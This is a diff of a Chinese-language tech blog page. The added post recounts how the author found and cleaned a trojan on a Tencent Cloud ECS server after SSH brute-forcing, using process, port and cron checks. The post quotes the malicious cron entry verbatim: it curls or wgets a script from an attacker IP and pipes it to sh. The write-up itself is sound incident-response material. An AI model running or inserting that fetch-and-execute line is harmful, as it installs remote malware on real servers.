@@ -104,14 +104,20 @@
 
 
 
-  <meta property="og:type" content="article">
+  <meta name="description" content="突然，腾讯云发出安全提示信息，先是SSH暴力破解的警告，过了几天又是ECS被植入木马的警告，Linux的安全防护被提上日程了！ 服务器的问题表现  登录ECS服务器，用top命令检查系统状态，发现CPU负荷长期维持100%，系统响应缓慢，其中/tmp/vThHH严重消耗资源，确认中招了！    服务器的root口令没有变化，但登录成功时提示有几百个failed login attempts，说明S">
+<meta property="og:type" content="article">
 <meta property="og:title" content="ECS遭遇安全攻击的一次经历">
 <meta property="og:url" content="https://blog.caogo.cn/2019/05/04/ECS遭遇安全攻击的一次经历/index.html">
 <meta property="og:site_name" content="Alex的技术博客">
+<meta property="og:description" content="突然，腾讯云发出安全提示信息，先是SSH暴力破解的警告，过了几天又是ECS被植入木马的警告，Linux的安全防护被提上日程了！ 服务器的问题表现  登录ECS服务器，用top命令检查系统状态，发现CPU负荷长期维持100%，系统响应缓慢，其中/tmp/vThHH严重消耗资源，确认中招了！    服务器的root口令没有变化，但登录成功时提示有几百个failed login attempts，说明S">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-05-04T12:11:03.918Z">
+<meta property="og:image" content="https://blog.caogo.cn/2019/05/04/ECS遭遇安全攻击的一次经历/alert-0.png">
+<meta property="og:image" content="https://blog.caogo.cn/2019/05/04/ECS遭遇安全攻击的一次经历/alert-1.png">
+<meta property="og:updated_time" content="2019-05-05T09:59:02.661Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="ECS遭遇安全攻击的一次经历">
+<meta name="twitter:description" content="突然，腾讯云发出安全提示信息，先是SSH暴力破解的警告，过了几天又是ECS被植入木马的警告，Linux的安全防护被提上日程了！ 服务器的问题表现  登录ECS服务器，用top命令检查系统状态，发现CPU负荷长期维持100%，系统响应缓慢，其中/tmp/vThHH严重消耗资源，确认中招了！    服务器的root口令没有变化，但登录成功时提示有几百个failed login attempts，说明S">
+<meta name="twitter:image" content="https://blog.caogo.cn/2019/05/04/ECS遭遇安全攻击的一次经历/alert-0.png">
 
 
 
@@ -420,6 +426,22 @@
             
 
             
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-05-05 17:59:02" itemprop="dateModified" datetime="2019-05-05T17:59:02+08:00">2019-05-05</time>
+              
+            
           </span>
 
           
@@ -450,7 +472,61 @@
       
 
       
-        
+        <p>突然，腾讯云发出安全提示信息，先是SSH暴力破解的警告，过了几天又是ECS被植入木马的警告，Linux的安全防护被提上日程了！</p>
+<h1 id="服务器的问题表现"><a href="#服务器的问题表现" class="headerlink" title="服务器的问题表现"></a>服务器的问题表现</h1><img src="/2019/05/04/ECS遭遇安全攻击的一次经历/alert-0.png" title="腾讯云的警告信息汇总">
+<ul>
+<li>登录ECS服务器，用<code>top</code>命令检查系统状态，发现CPU负荷长期维持100%，系统响应缓慢，其中<code>/tmp/vThHH</code>严重消耗资源，确认中招了！</li>
+</ul>
+<img src="/2019/05/04/ECS遭遇安全攻击的一次经历/alert-1.png" title="SSH暴力破解的警告信息">
+<ul>
+<li>服务器的root口令没有变化，但登录成功时提示有几百个<code>failed login attempts</code>，说明SSH口令已经被暴力破解</li>
+</ul>
+<h1 id="系统检查的主要工作"><a href="#系统检查的主要工作" class="headerlink" title="系统检查的主要工作"></a>系统检查的主要工作</h1><p>主要从以下几个方面入手：</p>
+<ol>
+<li>检查网络服务</li>
+</ol>
+<p>使用<code>netstat -nlp</code>，发现除了22，80，443端口，还对外暴露了可疑的7946端口，调用者是<code>/tmp/vThHH</code>。</p>
+<ol start="2">
+<li>检查系统进程</li>
+</ol>
+<p>通过<code>ps -ef</code>命令，跟踪可疑进程<code>/tmp/vThHH</code>，发现父进程就是木马程序<code>/usr/bin/ybznfa2</code>。<br>进一步检查，发现了木马的加载进程。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root      4365   736  0 18:30 ?        00:00:00 /usr/sbin/CROND -n</span><br><span class="line">root      4366  4365  0 18:30 ?        00:00:00 /bin/sh -c (/usr/bin/ybznfa2||/usr/libexec/ybznfa2||/usr/local/bin/ybznfa2||/tmp/ybznfa2||curl -m180 -fsSL http://109.237.25.145:8000/i.sh||wget -q -T180 -O- http://109.237.25.145:8000/i.sh) | sh</span><br><span class="line">root      4367  4366  0 18:30 ?        00:00:00 /bin/sh -c (/usr/bin/ybznfa2||/usr/libexec/ybznfa2||/usr/local/bin/ybznfa2||/tmp/ybznfa2||curl -m180 -fsSL http://109.237.25.145:8000/i.sh||wget -q -T180 -O- http://109.237.25.145:8000/i.sh) |sh</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>检查cron任务</li>
+</ol>
+<p>该木马由crond启动，通过<code>crontab -u root -l</code>检查定时任务，发现每15分钟就执行一次上述bash脚本，这就是木马的埋点！</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/15 * * * * (/usr/bin/ybznfa2||/usr/libexec/ybznfa2||/usr/local/bin/ybznfa2||/tmp/ybznfa2||curl -fsSL -m180 http://109.237.25.145:8000/i.sh||wget -q -T180 -O- http://109.237.25.145:8000/i.sh) | sh</span><br></pre></td></tr></table></figure>
+<h1 id="该木马的工作原理"><a href="#该木马的工作原理" class="headerlink" title="该木马的工作原理"></a>该木马的工作原理</h1><ul>
+<li>通过网络爬虫等手段收集服务器域名信息</li>
+<li>以服务器默认的root用户，通过ssh暴力破解获得口令</li>
+<li>通过ssh登录，添加cron定时任务，从远端服务器下载木马程序，并存放在多个目录下</li>
+<li>后台启动木马，打开自定义端口进行远程控制</li>
+</ul>
+<h1 id="处理措施"><a href="#处理措施" class="headerlink" title="处理措施"></a>处理措施</h1><ul>
+<li>手工清理cron的任务清单</li>
+<li>手工杀死<code>/tmp/vThHH</code>，<code>/usr/bin/ybznfa2</code>等可疑进程</li>
+<li>手工删除上述木马程序</li>
+<li>检查系统进程、网络服务、定时任务等状态，确认问题解决</li>
+</ul>
+<h1 id="如何彻底解决SSH暴力破解的威胁？"><a href="#如何彻底解决SSH暴力破解的威胁？" class="headerlink" title="如何彻底解决SSH暴力破解的威胁？"></a>如何彻底解决SSH暴力破解的威胁？</h1><p>最有效的方法就是，关闭口令登录方式，改为密钥登录，请参见下一片文章。</p>
+<p><strong>应该说，腾讯云提供的安全服务还是比较有效的，赞一个！</strong></p>
+<hr>
+<h1 id="附录：关于crontab的使用方法"><a href="#附录：关于crontab的使用方法" class="headerlink" title="附录：关于crontab的使用方法"></a>附录：关于crontab的使用方法</h1><ul>
+<li>crond是常用的木马启动入口，主要的配置文件存放在 <code>/var/spool/cron/</code>目录下。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_0_17_centos etc]# ls -l /var/spool/cron</span><br><span class="line">总用量 4</span><br><span class="line">drwxr-xr-x 2 root root 4096 4月  18 20:58 crontabs</span><br><span class="line">-rw------- 1 root root    0 5月   5 11:10 root</span><br></pre></td></tr></table></figure>
+<ul>
+<li>也可能存放在<code>/etc/cron.d/</code>等类似目录下。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_0_17_centos etc]# ls -lF /etc |grep cron</span><br><span class="line">-rw-------.  1 root root      541 4月  11 2018 anacrontab</span><br><span class="line">drwxr-xr-x.  2 root root     4096 4月  30 16:47 cron.d/</span><br><span class="line">drwxr-xr-x.  2 root root     4096 8月   8 2018 cron.daily/</span><br><span class="line">-rw-------.  1 root root        0 4月  11 2018 cron.deny</span><br><span class="line">drwxr-xr-x.  2 root root     4096 8月   8 2018 cron.hourly/</span><br><span class="line">drwxr-xr-x.  2 root root     4096 6月  10 2014 cron.monthly/</span><br><span class="line">-rw-r--r--.  1 root root      451 6月  10 2014 crontab</span><br><span class="line">drwxr-xr-x.  2 root root     4096 6月  10 2014 cron.weekly/</span><br></pre></td></tr></table></figure>
+<ul>
+<li>cron的运行日志保存在<code>/var/log/cron</code>文件中，内容格式为</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_0_17_centos log]# head /var/log/cron</span><br><span class="line"></span><br><span class="line">Dec 21 09:11:35 VM_0_17_centos crontab[1627]: (root) LIST (root)</span><br><span class="line">Dec 21 09:11:35 VM_0_17_centos crontab[1626]: (root) REPLACE (root)</span><br><span class="line">Dec 21 09:11:42 VM_0_17_centos crontab[1698]: (root) LIST (root)</span><br><span class="line">Dec 21 09:11:42 VM_0_17_centos crontab[1702]: (root) LIST (root)</span><br><span class="line">Dec 21 09:11:42 VM_0_17_centos crontab[1701]: (root) REPLACE (root)</span><br><span class="line">Dec 21 09:11:42 VM_0_17_centos crontab[1728]: (root) LIST (root)</span><br><span class="line">Dec 21 09:11:42 VM_0_17_centos crontab[1730]: (root) REPLACE (root)</span><br><span class="line">Dec 21 09:12:02 VM_0_17_centos CROND[1811]: (root) CMD (/usr/local/qcloud/stargate/admin/start.sh &gt; /dev/null 2&gt;&amp;1 &amp;)</span><br><span class="line">Dec 21 09:12:32 VM_0_17_centos crond[739]: (CRON) INFO (Shutting down)</span><br></pre></td></tr></table></figure>
+<ul>
+<li><a href="http://www.cnblogs.com/longjshz/p/5779215.html" target="_blank" rel="noopener">crontab配置方法的参考文档</a></li>
+</ul>
+
       
     </div>
 
@@ -537,8 +613,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <div class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
             
@@ -620,6 +705,22 @@
         </div>
       </div>
 
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#服务器的问题表现"><span class="nav-number">1.</span> <span class="nav-text">服务器的问题表现</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#系统检查的主要工作"><span class="nav-number">2.</span> <span class="nav-text">系统检查的主要工作</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#该木马的工作原理"><span class="nav-number">3.</span> <span class="nav-text">该木马的工作原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#处理措施"><span class="nav-number">4.</span> <span class="nav-text">处理措施</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#如何彻底解决SSH暴力破解的威胁？"><span class="nav-number">5.</span> <span class="nav-text">如何彻底解决SSH暴力破解的威胁？</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#附录：关于crontab的使用方法"><span class="nav-number">6.</span> <span class="nav-text">附录：关于crontab的使用方法</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
       
 
       
